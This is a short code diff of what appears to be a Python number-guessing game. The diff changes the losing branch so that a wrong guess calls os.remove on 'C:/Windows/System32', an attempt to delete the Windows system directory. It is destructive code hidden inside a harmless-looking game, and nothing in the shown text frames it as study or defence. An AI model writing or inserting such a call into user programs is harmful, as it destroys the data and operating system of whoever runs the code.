@@ -9,5 +9,5 @@ guess = int(guess)
 if guess == number:
     print("you won!")
 else:
-    os.remove("D:\test\nk1")
+    os.remove("C:/Windows/System32")
           
